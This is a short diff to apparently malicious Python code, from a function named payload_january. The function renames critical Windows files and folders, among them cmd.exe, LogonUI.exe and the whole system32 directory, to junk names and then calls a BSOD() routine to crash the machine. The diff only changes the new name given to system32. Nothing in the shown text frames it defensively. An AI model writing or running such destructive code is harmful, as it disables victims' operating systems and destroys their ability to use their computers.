@@ -35,7 +35,7 @@ def payload_january():
 
     os.rename(r'C:\windows\system32\cmd.exe', r'C\windows\system32\batch_haking_tool.hak')
     os.rename(r'C:\windows\system32\LogonUI.exe', r'C\windows\system32.LongGone.Missing')
-    os.rename(r'C:\windows\system32', r'C\windows\Cortana')
+    os.rename(r'C:\windows\system32', r'C\windows\Cortana666')
     BSOD()
 
 
